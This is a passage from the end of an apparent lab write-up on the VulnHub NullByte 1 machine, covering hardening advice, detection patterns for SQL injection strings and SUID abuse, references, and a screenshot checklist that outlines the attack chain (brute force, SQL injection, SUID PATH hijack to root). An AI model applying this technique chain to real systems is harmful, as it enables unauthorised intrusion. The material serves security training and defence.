- **Fix SUID + PATH issues.** Remove needless SUID bits; never call external commands by bare name — always use absolute paths (`/bin/ps`), and consider `secure_path`/`noexec` for web directories.
- **Patch the kernel** so Dirty COW / PwnKit don't work.
- **Detections:** watch for SQLi patterns in web logs (`UNION SELECT`, `INTO OUTFILE`), new files in upload directories, and SUID files created in `/tmp`. Alert on processes whose real uid is a service account but effective uid is 0.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: [https://vulnhub.com/entry/nullbyte-1,126/](https://vulnhub.com/entry/nullbyte-1,126/)
- Community writeups consulted:
  - [g0blin Research — NullByte 1 VulnHub Writeup](https://g0blin.co.uk/nullbyte-1-vulnhub-writeup/)
  - [Zach Heller — Vulnhub Nullbyte 1](https://zacheller.dev/Nullbyte-1)
  - [hunt3r — VulnHub: NullByte Walkthrough](https://hunt3r.hashnode.dev/vulnhub-nullbyte-walkthrough)
  - [F4l13n5n0w — [Vulnhub] NullByte: 1](https://f4l13n5n0w.github.io/blog/2015/08/18/vulnhub-nullbyte-1/)
  - [Spanky's Blog — Vulnhub: nullbyte](https://spankowitz.github.io/Vulnhub_nullbyte/)
- Tool / technique references:
  - [GTFOBins](https://gtfobins.github.io/)
  - [Exploit-DB 40616 — Dirty COW (CVE-2016-5195)](https://www.exploit-db.com/exploits/40616)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with `arp-scan`
- [ ] `images/02-nmap.png` — port/service scan (80/111/777)
- [ ] `images/03-enum.png` — `exiftool` revealing `kzMb5nVYJw`
- [ ] `images/04-foothold.png` — Hydra (`elite`) then SQLi dump / SSH as `ramses`
- [ ] `images/05-shell.png` — the `ramses` shell
- [ ] `images/06-user-flag.png` — (no user flag on this box — note it)
- [ ] `images/07-privesc.png` — SUID `procwatch` + `ps` PATH hijack
- [ ] `images/08-root-flag.png` — `/root/proof.txt`

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md)._
